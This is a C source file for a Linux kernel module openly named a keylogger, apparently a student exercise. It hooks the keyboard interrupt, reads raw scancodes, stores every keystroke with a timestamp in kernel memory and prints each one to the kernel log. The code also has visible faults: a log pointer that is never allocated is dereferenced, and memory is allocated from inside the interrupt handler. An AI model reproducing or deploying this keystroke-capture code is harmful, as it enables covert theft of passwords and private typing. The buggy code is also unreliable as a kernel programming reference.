// SPDX-License-Identifier: GPL-2.0-or-later
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/hil.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/time.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
MODULE_DESCRIPTION("keyboard bad keylogger");

#define	MODULE_NAME		"keylogger"
#define KEYBOARD_IRQ		1

struct key_map {
	char			acii;
	unsigned int		scancode;
	const char		*name;
	bool			pressed;
	size_t			press_count;
};

static struct key_map		*key_caps;
static struct key_map		*key_shift_left;
static struct key_map		*key_shift_right;
static bool			caps_lock;

enum e_key_event {
	PRESS,
	RELEASE
};

// this structure describe a log entry
// key : witch key this key refers to, it will point on key_table
// timestamp : when this event occured
// event : was it a press or a release ?

struct key_log_entry {
	struct key_map		*key;
	struct tm		timestamp;
	enum e_key_event	event;
};

struct key_log_index {
	struct key_log_index	*prev;
	struct key_log_index	*next;
	size_t			available;
	size_t			used;
	struct key_log_entry	*entries;
};

static struct key_log_index	*key_full_log;

static struct key_log_index *key_log_create_page(struct key_log_index *next)
{
	void		*ptr;
	size_t		blocks;

	ptr = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (!ptr)
		return NULL;
	blocks = (PAGE_SIZE - (sizeof(struct key_log_index))) /
		 sizeof(struct key_log_entry);
	pr_info("created a new page of %lu logs enties", blocks);
	memset(ptr, 0, PAGE_SIZE);
	*((struct key_log_index *)ptr) = (struct key_log_index) {
		.prev = NULL,
		.next = next,
		.available = blocks,
		.used = 0,
		.entries = (void *)((size_t)ptr + sizeof(struct key_log_index))
	};
	if (next)
		next->prev = ptr;
	return ptr;
}

static void		key_log_clean(void)
{
	struct key_log_index	*lst;
	struct key_log_index	*next;

	lst = key_full_log;
	while (lst) {
		next = lst->next;
		memset(lst, 0, PAGE_SIZE);
		kfree(lst);
		lst = next;
	}
}

static struct key_map key_table[] = {
	(struct key_map){0x0, 0, "NUL", false, 0},
	(struct key_map){0x1, 1, "Escape", false, 0},
	(struct key_map){'1', 2, "1", false, 0},
	(struct key_map){'2', 3, "2", false, 0},
	(struct key_map){'3', 4, "3", false, 0},
	(struct key_map){'4', 5, "4", false, 0},
	(struct key_map){'5', 6, "5", false, 0},
	(struct key_map){'6', 7, "6", false, 0},
	(struct key_map){'7', 8, "7", false, 0},
	(struct key_map){'8', 9, "8", false, 0},
	(struct key_map){'9', 10, "9", false, 0},
	(struct key_map){'0', 11, "0", false, 0},
	(struct key_map){'-', 12, "-", false, 0},
	(struct key_map){'=', 13, "=", false, 0},
	(struct key_map){0x7f, 14, "DEL", false, 0},
	(struct key_map){'\t', 15, "TAB", false, 0},
	(struct key_map){'q', 16, "q", false, 0},
	(struct key_map){'w', 17, "w", false, 0},
	(struct key_map){'e', 18, "e", false, 0},
	(struct key_map){'r', 19, "r", false, 0},
	(struct key_map){'t', 20, "t", false, 0},
	(struct key_map){'y', 21, "y", false, 0},
	(struct key_map){'u', 22, "u", false, 0},
	(struct key_map){'i', 23, "i", false, 0},
	(struct key_map){'o', 24, "o", false, 0},
	(struct key_map){'p', 25, "p", false, 0},
	(struct key_map){'[', 26, "[", false, 0},
	(struct key_map){']', 27, "]", false, 0},
	(struct key_map){'\n', 28, "Enter", false, 0},
	(struct key_map){0x0, 29, "Control-Left", false, 0},
	(struct key_map){'a', 30, "a", false, 0},
	(struct key_map){'s', 31, "s", false, 0},
	(struct key_map){'d', 32, "d", false, 0},
	(struct key_map){'f', 33, "f", false, 0},
	(struct key_map){'g', 34, "g", false, 0},
	(struct key_map){'h', 35, "h", false, 0},
	(struct key_map){'j', 36, "j", false, 0},
	(struct key_map){'k', 37, "k", false, 0},
	(struct key_map){'l', 38, "l", false, 0},
	(struct key_map){';', 39, ";", false, 0},
	(struct key_map){'\'', 40, "'", false, 0},
	(struct key_map){'-', 42, "Shift-Left", false, 0},
	(struct key_map){'\\', 43, "\\", false, 0},
	(struct key_map){'z', 44, "z", false, 0},
	(struct key_map){'x', 45, "x", false, 0},
	(struct key_map){'c', 46, "c", false, 0},
	(struct key_map){'v', 47, "v", false, 0},
	(struct key_map){'b', 48, "b", false, 0},
	(struct key_map){'n', 49, "n", false, 0},
	(struct key_map){'m', 50, "m", false, 0},
	(struct key_map){',', 51, ",", false, 0},
	(struct key_map){'.', 52, ".", false, 0},
	(struct key_map){'/', 53, "/", false, 0},
	(struct key_map){0x0, 54, "Shift-Right", false, 0},
	(struct key_map){' ', 56, "Alt-Right", false, 0},
	(struct key_map){' ', 57, "Space", false, 0},
	(struct key_map){0x0, 58, "Caps-Lock", false, 0},
	(struct key_map){0x0, 71, "Home", false, 0},
	(struct key_map){0x0, 72, "Arrow-Up", false, 0},
	(struct key_map){0x0, 73, "Page-Up", false, 0},
	(struct key_map){0x0, 75, "Arrow-Left", false, 0},
	(struct key_map){0x0, 77, "Arrow-Right", false, 0},
	(struct key_map){0x0, 79, "End", false, 0},
	(struct key_map){0x0, 80, "Arrow-Down", false, 0},
	(struct key_map){0x0, 81, "Page-Down", false, 0},
	(struct key_map){0x0, 82, "Insert", false, 0},
	(struct key_map){0x0, 92, "Command-Right", false, 0},
	(struct key_map){0x0, 93, "Menu", false, 0},
	(struct key_map){0x0, 0, NULL, false, 0}
};

static struct key_map *get_key(const unsigned int scancode)
{
	size_t		i;

	i = 0;
	while (key_table[i].name) {
		if (key_table[i].scancode == scancode)
			return &key_table[i];
		i++;
	}
	return NULL;
}

static ssize_t	read_key(struct file *file, char __user *buf, size_t size,
			 loff_t *offset)
{
	pr_info("reading device\n");
	return 0;
}

static ssize_t	write_key(struct file *file, const char __user *buf,
			  size_t size, loff_t *offset)
{
	pr_info("writing on device\n");
	return 0;
}

static const struct file_operations ops = {
	.read = read_key,
	.write = write_key
};

static struct key_log_entry *key_create_entry(struct key_map *key)
{
	struct timespec		ts;
	struct key_log_entry	*log;
	struct key_log_index	*page;

	// here we need a new page
	if (key_full_log->available == 0) {
		page = key_log_create_page(key_full_log);
		if (!page) {
			pr_err("failed to create a new page !\n");
			return NULL;
		}
		key_full_log = page;
	}
	getnstimeofday(&ts);
	log = &key_full_log->entries[key_full_log->used];
	log->key = key;
	log->event = (key->pressed) ? PRESS : RELEASE;
	time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &log->timestamp);
	key_full_log->used += 1;
	key_full_log->available -= 1;
	return (log);
}

static irqreturn_t	key_handler(int irq, void *dev_id)
{
	const unsigned int	scancode = inb(0x60);
	struct key_map		*key;

	key = get_key(scancode & 0x7f);
	if (key) {
		key->pressed = (scancode & 0x80) == 0;
		if (key->pressed)
			key->press_count += 1;
		key_create_entry(key);
		pr_info("(scan: %3u) -> %s : %10s [%4lu]\n", scancode,
			(key ? key->name : "/"),
			(key->pressed ? "pressed" : "released"),
			key->press_count);
	} else {
		pr_info("(scan: %3u) -> %s\n", scancode,
		       ((scancode & 0x80) == 0 ? "pressed" : "released"));
	}
	return IRQ_HANDLED;
}

static struct miscdevice		dev = {
	MISC_DYNAMIC_MINOR,
	MODULE_NAME,
	&ops
};

static void		__exit keylogger_clean(void)
{
	pr_info(MODULE_NAME "Cleaning up module.\n");
	free_irq(KEYBOARD_IRQ, &key_handler);
	misc_deregister(&dev);
	key_log_clean();
}

static int		__init hello_init(void)
{
	int		ret;

	pr_info(MODULE_NAME "init ! %lu\n", sizeof(struct key_log_entry));
	key_full_log = NULL;
	caps_lock = false;
	key_caps = get_key(14);
	key_shift_left = get_key(42);
	key_shift_right = get_key(54);
	ret = request_irq(KEYBOARD_IRQ, &key_handler, IRQF_SHARED, MODULE_NAME,
		&key_handler);
	if (ret < 0) {
		pr_err("failed to request keyboard irq: %d\n", ret);
		return ret;
	}
	ret = misc_register(&dev);
	if (ret < 0) {
		pr_err("failed to register device.\n");
		free_irq(KEYBOARD_IRQ, &key_handler);
		return 1;
	}
	return 0;
}

module_init(hello_init);
module_exit(keylogger_clean);
